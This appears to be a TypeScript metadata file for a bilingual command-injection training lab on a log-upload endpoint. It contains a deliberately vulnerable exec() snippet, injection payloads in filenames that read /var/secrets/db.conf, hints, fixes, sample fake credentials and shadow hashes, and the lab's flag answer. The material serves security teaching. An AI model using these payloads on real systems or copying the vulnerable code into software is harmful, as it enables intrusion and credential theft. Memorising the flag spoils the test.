// src/modules/practice-labs/command-injection/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab3Metadata: LabMetadata = {
  slug: 'cmdi-filename-log-analyzer-upload',
  title: 'Command Injection: Malicious Filename — Log Analyzer Upload',
  ar_title: 'حقن الأوامر: اسم ملف خبيث — رافع محلل السجلات',
  description:
    'Exploit a command injection vulnerability where the attack vector is the filename of an uploaded log file. The server passes the filename directly into a shell command for processing. Craft a malicious filename containing shell metacharacters to execute arbitrary commands.',
  ar_description:
    'استغل ثغرة حقن أوامر حيث يكون متجه الهجوم هو اسم الملف المرفوع. الخادم يمرر اسم الملف مباشرة في أمر shell للمعالجة. أنشئ اسم ملف خبيث يحتوي على shell metacharacters لتنفيذ أوامر عشوائية.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'File Upload Security',
    'Filename Sanitization',
    'Shell Metacharacter Injection',
  ],
  xpReward: 260,
  pointsReward: 130,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Upload a log file with a malicious filename like "access$(cat /var/secrets/db.conf).log". The server processes the filename in a shell command — extract the database credentials hidden in /var/secrets/db.conf.',
  ar_goal:
    'ارفع ملف سجل باسم ملف خبيث مثل "access$(cat /var/secrets/db.conf).log". الخادم يُعالج اسم الملف في أمر shell — استخرج بيانات اعتماد قاعدة البيانات المخفية في /var/secrets/db.conf.',

  briefing: {
    en: `LogVault — centralized log analysis platform. Upload your access logs for error analysis.
POST /logs/upload { "filename": "access.log" }
Response: { "errorCount": 42 }
The backend: exec("grep ERROR /uploads/access.log | wc -l")
Your filename goes in. No path validation.
But wait — where else is user input trusted blindly?
Filenames.
Developers forget filenames are user-controlled.
They validate file content. They check file extensions.
But the filename string itself?
It goes straight into the command.
Try: "access; whoami .log"
Or: "access$(whoami).log"
$(command) is a subshell substitution.
The shell executes whoami inside $().
The output becomes part of the filename string.
During execution.
So exec("grep ERROR /uploads/access$(cat /var/secrets/db.conf).log | wc -l")
Becomes something very different.`,
    ar: `LogVault — منصة تحليل سجلات مركزية. ارفع سجلات الوصول لتحليل الأخطاء.
POST /logs/upload { "filename": "access.log" }
الاستجابة: { "errorCount": 42 }
الـ backend: exec("grep ERROR /uploads/access.log | wc -l")
اسم ملفك يدخل. بدون تحقق من المسار.
لكن انتظر — أين يُثق بالمدخلات بشكل أعمى؟
أسماء الملفات.
المطورون ينسون أن أسماء الملفات يتحكم فيها المستخدم.
يتحققون من محتوى الملف. يفحصون امتدادات الملفات.
لكن سلسلة اسم الملف نفسها؟
تذهب مباشرة إلى الأمر.
جرب: "access; whoami .log"
أو: "access$(whoami).log"
$(command) هو استبدال subshell.
يُنفِّذ الشيل whoami داخل $().
الناتج يصبح جزءاً من سلسلة اسم الملف.
أثناء التنفيذ.
لذا exec("grep ERROR /uploads/access$(cat /var/secrets/db.conf).log | wc -l")
يصبح شيئاً مختلفاً جداً.`,
  },

  stepsOverview: {
    en: [
      'POST /logs/upload { "filename": "access.log" } — confirm normal operation, get errorCount',
      'Test subshell: { "filename": "access$(whoami).log" } — if response changes or includes username, injection confirmed',
      'Simple injection: { "filename": "access.log; cat /var/secrets/db.conf" } — semicolon breaks out of grep',
      'Or subshell injection: { "filename": "access$(cat /var/secrets/db.conf).log" } — db.conf output embedded in command string',
      'Flag extracted from /var/secrets/db.conf: FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS}',
    ],
    ar: [
      'POST /logs/upload { "filename": "access.log" } — أكّد الأداء العادي، احصل على errorCount',
      'اختبر subshell: { "filename": "access$(whoami).log" } — إذا تغيرت الاستجابة أو تضمنت اسم مستخدم، تأكيد الحقن',
      'حقن بسيط: { "filename": "access.log; cat /var/secrets/db.conf" } — الفاصلة المنقوطة تكسر grep',
      'أو حقن subshell: { "filename": "access$(cat /var/secrets/db.conf).log" } — ناتج db.conf مضمَّن في سلسلة الأمر',
      'العلم مُستخرَج من /var/secrets/db.conf: FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS}',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'LogVault /logs/upload takes the filename parameter and embeds it directly: exec("grep ERROR /uploads/" + filename + " | wc -l"). The filename is not sanitized for shell metacharacters. Subshell substitution $() executes commands during string evaluation. The server responds with the grep count — but with subshell injection, the executed command output appears in the response or causes an error that leaks data.',
    vulnerableCode:
      '// Log processor (vulnerable):\n' +
      "app.post('/logs/upload', isAuthenticated, async (req, res) => {\n" +
      '  const filename = req.body.filename; // User-controlled!\n' +
      '  // ❌ Filename goes directly into shell command\n' +
      '  const result = await exec(`grep ERROR /uploads/${filename} | wc -l`);\n' +
      '  res.json({ errorCount: result.stdout.trim() });\n' +
      '});',
    exploitation:
      'Method 1 (semicolon): POST /logs/upload { "filename": "access.log; cat /var/secrets/db.conf" }\n' +
      'Method 2 (subshell): POST /logs/upload { "filename": "access$(cat /var/secrets/db.conf).log" }\n' +
      'Both execute cat /var/secrets/db.conf during command processing.',
    steps: {
      en: [
        'POST /logs/upload { "filename": "access$(whoami).log" } → errorCount includes "www-data" → injection confirmed',
        'POST /logs/upload { "filename": "access.log; cat /var/secrets/db.conf" } → db.conf contents appear in response',
        'Or: { "filename": "access$(cat /var/secrets/db.conf).log" } → subshell output embedded in response',
        'Flag: FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS} in DB_PASS/FLAG field of db.conf',
      ],
      ar: [
        'POST /logs/upload { "filename": "access$(whoami).log" } → errorCount يتضمن "www-data" → تأكيد الحقن',
        'POST /logs/upload { "filename": "access.log; cat /var/secrets/db.conf" } → محتويات db.conf تظهر في الاستجابة',
        'أو: { "filename": "access$(cat /var/secrets/db.conf).log" } → ناتج subshell مضمَّن في الاستجابة',
        'العلم: FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS} في حقل DB_PASS/FLAG لـ db.conf',
      ],
    },
    fix: [
      'Sanitize filenames strictly: /^[a-zA-Z0-9_\\-\\.]{1,100}$/ — reject any filename with metacharacters',
      'Path.basename() normalization: always extract just the filename, discard any path components',
      'execFile() instead of exec(): pass filename as an argument array — shell is not invoked',
      'Process uploads in a sandboxed environment: the grep process should have no access to /var/secrets/',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Filename injection is a commonly overlooked attack surface. Developers validate file content (mime type, magic bytes) and sometimes the extension — but the filename string itself is often passed directly to processing commands. Shell subshell substitution $() and backtick execution `` are particularly dangerous because they execute during string evaluation, before the command even runs. This means even a "safe-looking" filename can inject commands at the point of shell interpretation.',
      ar: 'حقن اسم الملف هو سطح هجوم يُغفَل عنه كثيراً. المطورون يتحققون من محتوى الملف (نوع mime، البايتات السحرية) وأحياناً الامتداد — لكن سلسلة اسم الملف نفسها غالباً ما تُمرَّر مباشرة لأوامر المعالجة. استبدال subshell $() والتنفيذ بالعكسية `` خطيران بشكل خاص لأنهما يُنفَّذان أثناء تقييم السلسلة، قبل أن يُشغَّل الأمر حتى. هذا يعني أن اسم ملف يبدو "آمناً" يمكنه حقن الأوامر عند نقطة تفسير shell.',
    },
    impact: {
      en: 'The /var/secrets/db.conf file contains production database credentials (host, user, password, database name) and the FLAG. In a real scenario, these credentials grant direct access to the entire production database — all user records, logs, application data. Additionally, /etc/shadow is accessible, providing hashed passwords for offline cracking.',
      ar: 'يحتوي ملف /var/secrets/db.conf على بيانات اعتماد قاعدة البيانات الإنتاجية (host، user، password، اسم قاعدة البيانات) والـ FLAG. في سيناريو حقيقي، تمنح هذه البيانات وصولاً مباشراً لقاعدة البيانات الإنتاجية بأكملها — كل سجلات المستخدمين، السجلات، بيانات التطبيق. بالإضافة إلى ذلك، يمكن الوصول إلى /etc/shadow، مما يوفر كلمات مرور مُجزَّأة للكسر دون اتصال.',
    },
    fix: [
      'Filename allowlist: only accept [a-z0-9_.-] — reject everything else at the API boundary',
      'Never use filenames in shell commands: reference files by internal ID, not user-provided name',
      'Rename uploaded files on server side: UUID + extension — user-provided filename never touches the filesystem directly',
      "Content-based processing: use streaming parsers that don't invoke shell at all",
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'Try a normal filename first: "access.log". Works fine. Now try "access$(whoami).log" — the $() is a subshell substitution executed by bash. Does the response change?',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'Shell subshell: $(command) executes command and substitutes its output into the string. So "file$(whoami).log" makes the shell run whoami during command processing.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'POST /logs/upload with { "filename": "access.log; cat /var/secrets/db.conf" }. The semicolon separates commands — the second command reads the secrets file and its output appears in the response.',
    },
    {
      order: 4,
      xpCost: 75,
      content:
        'Try filename: "access$(cat /var/secrets/db.conf).log" — the subshell runs cat during filename evaluation and the secrets content appears in the response or error output.',
    },
  ],

  flagAnswer: 'FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS}',
  initialState: {
    contents: [
      {
        title: 'DB_CONF',
        body: JSON.stringify({
          path: '/var/secrets/db.conf',
          content:
            '# Production Database Config\nDB_HOST=prod-db-01.internal\nDB_USER=logvault_admin\nDB_PASS=Pr0d_DB_S3cr3t_2024!\nDB_NAME=logvault_prod\nFLAG=FLAG{CMDI_FILENAME_INJECTION_LOG_UPLOAD_SECRETS}',
        }),
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'SHADOW',
        body: JSON.stringify({
          path: '/etc/shadow',
          content:
            'root:$6$xyz$hashedpassword:19000:0:99999:7:::\nlogvault:$6$abc$anotherhash:19000:0:99999:7:::',
        }),
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
